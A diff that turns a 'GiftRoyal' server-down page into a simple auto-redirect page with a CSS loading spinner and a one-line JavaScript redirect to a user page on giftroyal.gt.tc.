@@ -1,12 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GiftRoyal</title>
+<title>Auto Redirect</title>
 <style>
-    body, html {
-        margin: 0;
-        padding: 0;
-        height: 100%;
-        overflow: hidden;
-    }
+body {
+  margin: 0;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background: #eef1f7;
+  font-family: 'Poppins', sans-serif;
+  flex-direction: column;
+  color: #333;
+}
+.loader {
+  border: 5px solid #ddd;
+  border-top: 5px solid #007bff;
+  border-radius: 50%;
+  width: 50px;
+  height: 50px;
+  animation: spin 1s linear infinite;
+  margin-bottom: 20px;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
 </style>
-<h2>App Server Down!</h2>
+</head>
+<body>
+  <div class="loader"></div>
+  <h2>Redirecting...</h2>
+  <script>
+    window.location.href = "https://giftroyal.gt.tc/app/user/index.php";
+  </script>
+</body>
+</html>
